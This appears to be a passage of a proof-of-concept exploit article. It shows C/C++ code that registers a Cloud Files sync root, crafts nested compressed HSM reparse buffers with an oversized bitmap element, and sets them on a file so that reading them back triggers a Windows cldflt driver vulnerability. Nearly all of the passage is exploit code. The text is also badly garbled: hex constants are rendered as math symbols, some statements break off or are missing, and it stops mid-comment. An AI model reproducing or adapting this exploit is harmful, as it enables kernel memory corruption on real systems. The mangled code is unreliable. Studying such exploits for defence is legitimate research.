static const USHORT REPARSE\_DATA\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT PAYLOAD\_SIZE\_OVERFLOW $=$ 0x1010;\
\
static const USHORT PAYLOAD\_OFFSET $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
#pragma pack(push, 1)\
\
typedef struct \_HSM\_ELEMENT\_INFO { USHORT Type; USHORT Length; ULONG Offset;\
\
} HSM\_ELEMENT\_INFO, $\\star$ PHSM\_ELEMENT\_INFO;\
\
// Note: For FeRp, we must prepend Version $^ +$ StructSize at offsets $\\Theta \\times \\odot \\Theta - \\odot \\times \\odot 3$ , // and then this HSM\_DATA content starts at $+ \\odot \\times \\odot 4$ in the buffer we build. typedef struct \_HSM\_DATA {\
\
} HSM\_DATA, $\\star$ PHSM\_DATA;\
\
typedef struct \_HSM\_REPARSE\_DATA { USHORT Flags; USHORT Length; HSM\_DATA FileData;\
\
} HSM\_REPARSE\_DATA, $\\star$ PHSM\_REPARSE\_DAT\
\
typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer\[FERP\_BUFFER\_SIZE\]; } GenericReparseBuffer;\
\
} REPARSE\_DATA\_BUFFER, $\\star$ PREPARSE\_DATA\_BUFFER;\
\
typedef struct \_REPARSE\_DATA\_BUFFER\_EX { ULONG Flags; ULONG ExistingReparseTag; GUID ExistingReparseGuid; ULONGLONG Reserved; REPARSE\_DATA\_BUFFER ReparseDataBuffer; REPARSE\_DATA\_BUFFER\_EX, PREPARSE\_DATA\_BUFFER\_EX;\
\
#pragma pack(pop)\
\
typedef enum \_HSM\_ELEMENT\_OFFSETS { ELEM\_TYPE $\\begin{array} { r l } { \\mathbf { \\Sigma } } { \\mathbf { \\Sigma } } = & { { } \\odot \\times \\odot \\odot \\mathbf { \\Sigma } } \\end{array}$ , ELEM\_LENGTH $=$ $\\Theta \\times \\Theta 2$ ,\
\
[https://exploitreversing.com](https://exploitreversing.com/) ELEM\_OFFSET $=$ $\\Theta \\times \\Theta 4$ ,\
\
} HSM\_ELEMENT\_OFFSETS;\
\
typedef enum \_HSM\_DATA\_OFFSETS { DATA\_MAGIC $=$ $\\Theta \\times \\Theta \\Theta$ , DATA\_CRC32 $=$ $\\Theta \\times \\Theta 4$ , DATA\_LENGHT $=$ $\\Theta \\times \\Theta 8$ , DATA\_FLAGS $=$ $\\Theta \\times \\Theta \ C$ , DATA\_NR\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { E }$ ,\
\
} HSM\_DATA\_OFFSETS;\
\
typedef enum \_HSM\_FERP\_OFFSETS { FERP\_VERSION $=$ $\\Theta \\times \\Theta \\Theta$ , FERP\_STRUCT\_SIZE $=$ $\\Theta \\times \\Theta 2$ , FERP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , FERP\_CRC $=$ $\\Theta \\times \\Theta 8$ , FERP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , // (StructSize - 4) FERP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , FERP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$\
\
} HSM\_FERP\_OFFSETS;\
\
typedef enum \_HSM\_BTRP\_OFFSETS { BTRP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , BTRP\_CRC $=$ $\\Theta \\times \\Theta 8$ , BTRP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , BTRP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , BTRP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$\
\
} HSM\_BTRP\_OFFSETS;\
\
static ULONG Calculate\_CRC32(ULONG seed, const void\* buf, size\_t len) { ULONG crc $=$ ~seed; const unsigned char\* p $=$ (const unsigned char\*)buf; for (size\_t i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ len; ++i) { crc $\\Lambda =$ p\[i\]; for (int j $=$ 0; j < 8; ++j) { if (crc & 1) crc $=$ (crc >> 1) ^ $\\Theta \\times$ EDB88320; else crc $> > = ~ 1$ ; } } return ~crc;\
\
}\
\
static void ValidateBtRp(const char\* buffer\_btrp, int count, const HSM\_ELEMENT\_INFO\* elements, unsigned short totalSize) {\
\
printf("\\n \[+\] BtRp header:\\n"); printf(" \[-\] $+ \\odot 4$ : magi $\\mathsf { C } = \\odot \\mathsf { X } \_ { \\prime 0 } ^ { 0 \\prime } \\odot \\mathsf { 8 X } \\backslash$ n", $\\star$ (const UINT $\\star$ )(buffer\_btrp $^ +$ BTRP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C } \\mathsf { r } \\mathsf { C } = \\odot \\times \_ { \\mathsf { \\Omega } ^ { \\prime } \\circ } ^ { \\circ \\prime } \\odot \\mathsf { 8 } \\times \\mathsf { \\Omega } \\mathsf { n } ^ { \\prime \\prime }$ , $\\star$ (const UINT\*)(buffer\_btrp $^ +$ BTRP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : ushortLen $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_LENGTH)); printf(" \[-\] $+ 1 9$ : flag $\\mathsf { S } = \\odot \\times \\mathsf { \\Omega } \_ { < 0 } ^ { 0 / } \\odot 4 \\mathsf { X } \\backslash \\mathsf { r }$ ", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_FLAGS)); printf(" \[-\] $+ 1 2$ : numberOfElements $=$ %u\\n", $\\star$ (const USHORT\*)(buffer\_btrp $^ +$ BTRP\_MAX\_ELEMS)); printf(" \[-\] totalSize $=$ %u\\n", totalSize); USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ count $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf $( 1 1 ) \\setminus \[ + \]$ BtRpData base $=$ 0x%X\\n", base);\
\
for (int $\\begin{array} { r l r } { \\dot { { \\bf \\varphi } } } & { { } = } & { { \\bf \\varphi } \\odot } \\end{array}$ ; i < count; i++) { printf(" \[-\] elements\[%d\]: type $=$ 0x%02X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); }\
\
}\
\
static void ValidateFeRp(const char\* buffer\_ferp, int count, const HSM\_ELEMENT\_INFO\*\
\
elements, unsigned short totalSize) { printf("\[+\] FeRp header:\\n"); printf(" \[-\] $+ \\odot \\Theta$ : version=0x%04X\\n", $\\star$ (const USHORT\*)(buffer\_ferp +\
\
FERP\_VERSION)); printf(" \[-\] $+ \\odot 2$ : structSize $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_ferp +\
\
FERP\_STRUCT\_SIZE)); printf(" \[-\] $+ \\odot 4$ : magic=0x%08X\\n", $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C } \\mathsf { r } \\mathsf { C } = \\odot \\times \_ { \\prime 0 } ^ { 0 \\prime } \\odot & \\times \\mathsf { \\Omega } \\backslash \\mathsf { n } ^ { \\prime }$ ", $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : dwordLen $=$ %u\\n", \*(const UINT\*)(buffer\_ferp $^ +$ FERP\_LENGTH)); printf(" \[-\] $+ 1 9$ : $= 2 \\mathsf { a g s } = \\Theta \\times \\mathsf { \\Omega } \_ { 0 } ^ { 0 \\prime } \\Theta 4 \\mathsf { X } \\setminus \\mathsf { n } ^ { \\prime \\prime }$ , $\\star$ (const USHORT\*)(buffer\_ferp $^ +$ FERP\_FLAGS)); printf(" \[-\] $+ 1 2$ : max\_elements $=$ %u\\n", $\\star$ (const USHORT\*)(buffer\_ferp +\
\
FERP\_MAX\_ELEMS)); printf(" $\[ + \]$ Computed totalSize $=$ %u\\n", totalSize); // Remember: For FeRp, the format reserves 10 descriptors, even though we only use\
\
5\. USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ MAX\_ELEMS $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf("\\n\[+\] FeRpData base $= \\odot \\times \\mathrm { \_ { \\it { c 0 } } ^ { 0 \\prime } } \\mathrm { X }$ (reserved 10 descriptors)\\n", base); for (int i = 0; i $\\textless$ count; i++) { printf(" \[-\] elements\[%d\]: type $=$ 0x%02X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); }\
\
}\
\
static USHORT BtRpBuildBuffer( HSM\_ELEMENT\_INFO\* elements, char\*\* input\_data, int count, char\* btrp\_data\_buffer\
\
) { memset(btrp\_data\_buffer, 0, BTRP\_BUFFER\_SIZE); $\\star ( { \\mathsf { U L O N G } } { \\star }$ )(btrp\_data\_buffer $^ +$ BTRP\_MAGIC) $=$ HSM\_BITMAP\_MAGIC; // 0x70527442 $\\star ( \\mathsf { U S H O R T } \\star$ )(btrp\_data\_buffer $^ +$ BTRP\_MAX\_ELEMS) $=$ (USHORT)count; char $\\star$ ptr $=$ btrp\_data\_buffer $^ +$ HSM\_HEADER\_SIZE; for (int $\\begin{array} { r l r } { \\dot { { \\bf \\varphi } } } & { { } = } & { { \\bf \\varphi } \\odot } \\end{array}$ ; i $\\textless$ count; i++) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(ptr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (ptr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ (ptr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(btrp\_data\_buffer $^ +$ elements\[i\].Offset + 4, input\_data\[i\], elements\[i\].Length); ptr $+ =$ sizeof(HSM\_ELEMENT\_INFO); }\
\
USHORT max\_offset $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) {\
\
USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ max\_offset) { max\_offset $=$ end; } } USHORT total $=$ (USHORT)(max\_offset + 4); $\\star ( \\mathsf { U S H O R T } \\star$ )(btrp\_data\_buffer $^ +$ BTRP\_LENGTH) $=$ total; $\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; if (total $< = ~ 8 ~ + ~ 0 { \\times } \\odot .$ ) { printf("\[-\] BtRp size too small for CRC calc: 0x%X\\n", total); return 0; } ULONG crc\_len $=$ (ULONG)(total - 8); ULONG crc $=$ Calculate\_CRC32(0, btrp\_data\_buffer $^ +$ BTRP\_LENGTH, crc\_len); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_CRC) $=$ crc; return total;\
\
}\
\
static USHORT FeRpBuildBuffer( HSM\_ELEMENT\_INFO\* elements, char\*\* input\_data, int count, char\* ferp\_ptr, USHORT max\_elements\
\
) { memset(ferp\_ptr, 0, FERP\_BUFFER\_SIZE); \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_VERSION) $=$ VERSION\_VALUE; \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $=$ 0; // filled later \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_MAGIC) $=$ HSM\_FILE\_MAGIC; \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_LENGTH) $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; // dwordLen placeholder \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (ferp\_ptr $^ +$ FERP\_MAX\_ELEMS) $=$ max\_elements; // MAX\_ELEMS $=$ 10 char\* descPtr $=$ ferp\_ptr $^ +$ HSM\_HEADER\_SIZE; // Program only uses 'count' descriptors; the rest of the 10 slots remain zeroed. for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(descPtr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (descPtr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ (descPtr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(ferp\_ptr $^ +$ elements\[i\].Offset, input\_data\[i\], elements\[i\].Length); descPtr $+ =$ HSM\_ELEMENT\_INFO\_SIZE; }\
\
USHORT position\_limit $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;\
\
for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length) if (end $>$ position\_limit) { position\_limit $=$ end; }\
\
}\
\
// Align to 8 bytes (FeRp requirement)\
\
USHORT rem $=$ (USHORT)(position\_limit % FERP\_ALIGN);\
\
if (rem ! $\\begin{array} { r l } { \\mathbf { \\Phi } } & { { } = \\mathbf { \\Phi } \\left( \\cdot \\mathbf { \\vec { \\mathbf { \\Lambda } } } \\right) . } \\end{array}$ ) { position\_limit $=$ (USHORT)(position\_limit $^ +$ (FERP\_ALIGN - rem));\
\
}\
\
$\\star ( { \\sf U L O N G } \\star )$ )(ferp\_ptr $^ +$ FERP\_LENGTH) $=$ (ULONG)(position\_limit - 4);\
\
if (position\_limit $< =$ HSM\_ELEMENT\_TYPE\_MAX) { printf("\[-\] FeRp position\_limit too small: 0x%X\\n", position\_limit); return 0;\
\
} // CRC covers \[ $\\Theta \\times \\Theta \ C$ .. StructSize), which is (StructSize - 12) bytes (check the\
\
reversed code) ULONG crc\_len $=$ (ULONG)(position\_limit - 8 - 4); ULONG crc $=$ Calculate\_CRC32(0, ferp\_ptr $^ +$ FERP\_LENGTH, crc\_len); $\\star ( { \\sf U L O N G } \\star )$ )(ferp\_ptr $^ +$ FERP\_CRC) $=$ crc; \*(USHORT $\\star$ )(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $=$ position\_limit; return position\_limit;\
\
}\
\
typedef NTSTATUS(NTAPI\* PRtlGetCompressionWorkSpaceSize)( USHORT, PULONG, PULONG);\
\
typedef NTSTATUS(NTAPI\* PRtlCompressBuffer)( USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);\
\
static unsigned long FeRpCompressBuffer(char\* input\_buffer, unsigned short input\_size,\
\
char\* output\_buffer) { HMODULE h\_Ntdll $=$ LoadLibraryW(L"ntdll.dll"); if (!h\_Ntdll) return 0; auto h\_CompressionWSS $=$ (PRtlGetCompressionWorkSpaceSize)GetProcAddress(h\_Ntdll,\
\
"RtlGetCompressionWorkSpaceSize"); auto h\_CompressBuffer $=$ (PRtlCompressBuffer)GetProcAddress(h\_Ntdll,\
\
"RtlCompressBuffer"); if (!h\_CompressionWSS \|\| !h\_CompressBuffer) { FreeLibrary(h\_Ntdll); return 0; } ULONG ws1 = 0, ws2 = 0;\
\
if (h\_CompressionWSS(2, &ws1, &ws2) != 0) { FreeLibrary(h\_Ntdll); return 0;\
\
} std::unique\_ptr<char\[\]> workspace(new char\[ws1\]);\
\
ULONG finalCompressedSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
// Compress from input\_buffer $^ +$ 4 (skipping Version+StructSize, which are checked only by HsmpRpValidateBuffer routine)\
\
FreeLibrary(h\_Ntdll); if (st != 0) return 0; return finalCompressedSize; }\
\
static int BuildAndSetCloudFilesReparsePoint(HANDLE hFile, int payload\_size, char\* payload\_buf) {\
\
const int BT\_COUNT $=$ ELEMENT\_NUMBER; // 5 elements (only the requested by our experiment) auto bt\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (BT\_COUNT);\
\
bt\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[1\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[2\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
bt\_elements\[3\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
bt\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
bt\_elements\[4\].Length $=$ (USHORT)payload\_size;\
\
// BtRp payload starts at $\\Theta \\times 6 \\Theta$ (it is imposed by FeRp structure with 10 possible elements).\
\
// We have 4-byte alignment between elements here.\
\
bt\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET;\
\
bt\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ;\
\
bt\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ;\
\
bt\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ;\
\
bt\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; std::unique\_ptr<char\[\]> bt\_buf(new char\[BTRP\_BUFFER\_SIZE\]);\
\
memset(bt\_buf.get(), 0, BTRP\_BUFFER\_SIZE); BYTE bt\_data\_00 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_01 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_02 = $\\Theta \\times \\Theta \\Theta$ ;\
\
UINT64 bt\_data\_03 $=$ $\\Theta \\times$ ABCDABCDABCDABCD;\
\
char\* bt\_data\[BT\_COUNT\] = { (char\*)&bt\_data\_00, (char\*)&bt\_data\_01, (char\*)&bt\_data\_02, (char\*)&bt\_data\_03, payload\_buf\
\
};\
\
USHORT bt\_buffer\_size $=$ BtRpBuildBuffer(bt\_elements.get(), bt\_data, BT\_COUNT, bt\_buf.get()); if (bt\_buffer\_size $\\begin{array} { r l } { \\mathbf { \\Sigma } = = } & { { } \\odot } \\end{array}$ ) { printf("\[-\] BtRpBuildBuffer failed\\n"); return -1; }\
\
printf("\[+\] BtBufferSize: 0x%04X\\n", bt\_buffer\_size);\
\
ValidateBtRp(bt\_buf.get(), BT\_COUNT, bt\_elements.get(), bt\_buffer\_size);\
\
const int FE\_COUNT $=$ ELEMENT\_NUMBER; // 5 used elements auto fe\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (FE\_COUNT);\
\
fe\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
fe\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
fe\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT32;\
\
fe\_elements\[1\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
fe\_elements\[2\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
fe\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[3\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[4\].Length $=$ bt\_buffer\_size;\
\
// FeRp payload also starts at $\\Theta \\times 6 \\Theta$ ; we only use 5 elements, but the format reserves 10 slots.\
\
fe\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET;\
\
fe\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ;\
\
fe\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ;\
\
fe\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ;\
\
fe\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; // BtRp blob std::unique\_ptr<char\[\]> fe\_buf(new char\[FERP\_BUFFER\_SIZE\]);\
\
memset(fe\_buf.get(), 0, FERP\_BUFFER\_SIZE); BYTE fe\_data\_00 = $\\Theta \\times 9 9$ ;\
\
UINT32 fe\_data\_01 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot \\odot \\odot 1$ ;\
\
UINT64 fe\_data\_02 $=$ $\\Theta \\times \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\odot \\downarrow$ ;\
\
UINT32 fe\_data\_03 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot 3 3$ ;\
\
char\* fe\_data\[FE\_COUNT\] $=$ { (char\*)&fe\_data\_00, (char $\\star$ )&fe\_data\_01, (char\*)&fe\_data\_02, (char\*)&fe\_data\_03, bt\_buf.get()\
\
}; USHORT fe\_size $=$ FeRpBuildBuffer(fe\_elements.get(), fe\_data, FE\_COUNT,\
\
fe\_buf.get(), MAX\_ELEMS); if (fe\_size $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { printf("\[-\] FeRpBuildBuffer failed\\n"); return -1; } printf("\\n\[+\] FeRp size: 0x%04X\\n", fe\_size); ValidateFeRp(fe\_buf.get(), FE\_COUNT, fe\_elements.get(), fe\_size); std::unique\_ptr<char\[\]> compressed(new char\[COMPRESSED\_SIZE\]); memset(compressed.get(), 0, COMPRESSED\_SIZE); unsigned long compressed\_size $=$ FeRpCompressBuffer(fe\_buf.get(), fe\_size,\
\
compressed.get()); if (compressed\_size == 0 \|\| compressed\_size $>$ COMPRESSED\_SIZE) { printf("\[-\] Compression failed or output too large (%lu bytes)\\n",\
\
compressed\_size); return -1; } printf("\[+\] Compressed FeRp size: 0x%lX\\n", compressed\_size); USHORT cf\_payload\_len $=$ (USHORT)(4 $^ +$ compressed\_size); std::unique\_ptr<char\[\]> cf\_blob(new char\[cf\_payload\_len\]); memset(cf\_blob.get(), 0, cf\_payload\_len); $\\star$ (USHORT $\\star$ )(cf\_blob.get() + 0) $=$ $\\Theta \\times 8 \\Theta \\Theta 1$ ; // CompressionFlag (compressed) $\\star$ (USHORT\*)(cf\_blob.get() + 2) $=$ fe\_size; // Uncompressed FeRp size memcpy(cf\_blob.get() + 4, compressed.get(), compressed\_size); REPARSE\_DATA\_BUFFER\_EX rep\_data\_buffer\_ex{}; rep\_data\_buffer\_ex.Flags $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ; rep\_data\_buffer\_ex.ExistingReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ExistingReparseGuid $=$ ProviderId; rep\_data\_buffer\_ex.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseDataLength $=$ cf\_payload\_len; rep\_data\_buffer\_ex.ReparseDataBuffer.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; memcpy(rep\_data\_buffer\_ex.ReparseDataBuffer.GenericReparseBuffer.DataBuffer,\
\
cf\_blob.get(), cf\_payload\_len); DWORD inSize $=$ (DWORD)( offsetof(REPARSE\_DATA\_BUFFER\_EX,\
\
ReparseDataBuffer.GenericReparseBuffer.DataBuffer) + cf\_payload\_len ); DWORD bytesReturned $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; BOOL ok $=$ DeviceIoControl( hFile, FSCTL\_SET\_REPARSE\_POINT\_EX, &rep\_data\_buffer\_ex, inSize, NULL, 0, &bytesReturned, NULL\
\
);\
\
if (!ok) { printf("\[-\] FSCTL\_SET\_REPARSE\_POINT\_EX failed! error $=$ %lu\\n", GetLastError()); return -1;\
\
}\
\
printf("\\n\[+\] DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file)\\n");\
\
// At this point we read reparse point back, which triggers the vulnerability. std::unique\_ptr<BYTE\[\]> q(new BYTE\[REPARSE\_DATA\_SIZE\]); DWORD outBytes $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if (DeviceIoControl(hFile, FSCTL\_GET\_REPARSE\_POINT, NULL, 0, q.get(), REPARSE\_DATA\_SIZE, &outBytes, NULL)) { auto reparsepoint $=$ reinterpret\_cast(q.get()); printf $\\lfloor 1 \\mid \[ + \]$ GET\_REPARSE (file): tag=0x%08lX, len=%u, total $=$ %lu\\n", reparsepoint->ReparseTag, reparsepoint->ReparseDataLength, (unsigned long)outBytes); } else { printf("\[-\] GET\_REPARSE (file) failed: %lu\\n", GetLastError()); } return 0; }\
\
int wmain(void) {\
\
PWSTR appDataPath $=$ NULL; HRESULT hrPath $=$ SHGetKnownFolderPath(FOLDERID\_RoamingAppData, 0, NULL,\
\
&appDataPath); if (FAILED(hrPath)) { wprintf(L"Failed to resolve %%APPDATA%%. HRESULT: 0x%08lX\\n", (unsigned\
\
long)hrPath); return -1; } wchar\_t syncRootPath\[MAX\_PATH\];\
\
swprintf(syncRootPath, MAX\_PATH, L"%s\\MySyncRoot", appDataPath);\
\
CreateDirectoryW(syncRootPath, NULL);\
\
wprintf(L"\[+\] Sync root directory ensured: %s\\n", syncRootPath);\
\
LPCWSTR identityStr $=$ L"Alexandre"; CF\_SYNC\_REGISTRATION registration{}; registration.StructSize $=$ sizeof(registration); registration.ProviderName $=$ L"E $. { \\bigtriangledown }$ ploitReversing"; registration.ProviderVersion $=$ L"1.0.0"; registration.ProviderId $=$ ProviderId; registration.SyncRootIdentity $=$ identityStr; registration.SyncRootIdentityLength $=$ (ULONG)(lstrlenW(identityStr) \* sizeof(WCHAR)); CF\_SYNC\_POLICIES policies{}; policies.StructSize $=$ sizeof(policies);\
\
policies.Hydration.Primary $=$ CF\_HYDRATION\_POLICY\_FULL; policies.Population.Primary $=$ CF\_POPULATION\_POLICY\_PARTIAL; policies.HardLink $=$ CF\_HARDLINK\_POLICY\_ALLOWED; policies.PlaceholderManagement $=$ CF\_PLACEHOLDER\_MANAGEMENT\_POLICY\_UPDATE\_UNRESTRICTED;\
\
HRESULT hrReg $=$ CfRegisterSyncRoot(syncRootPath, &registration, &policies, CF\_REGISTER\_FLAG\_DISABLE\_ON\_DEMAND\_POPULATION\_ON\_ROOT); if (FAILED(hrReg)) { wprintf(L"\[-\] Sync root registration failed: $\\Theta \\times % 0 5 $ 8lX\\n", (unsigned long)hrReg); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] Sync root registered at %s\\n", syncRootPath); wchar\_t filePath\[MAX\_PATH\]; swprintf(filePath, MAX\_PATH, L"%s\\ers06", syncRootPath); DWORD attrs $=$ GetFileAttributesW(filePath); if (attrs ! $=$ INVALID\_FILE\_ATTRIBUTES) { SetFileAttributesW(filePath, FILE\_ATTRIBUTE\_NORMAL); if (!DeleteFileW(filePath)) { wprintf(L"\[-\] Failed to delete existing file: %s (Error %lu)\\n", filePath, GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[i\] $\\mathsf { E x }$ isting file deleted: %s\\n", filePath); } HANDLE hFile $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, CREATE\_NEW, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Failed to create file: %s (Error %lu)\\n", filePath,\
\
GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] File created: %s\\n", filePath); std::unique\_ptr<char\[\]> payload(new char\[REPARSE\_DATA\_SIZE\]); memset(payload.get(), 0, REPARSE\_DATA\_SIZE); // Zero entire buffer to prevent\
\
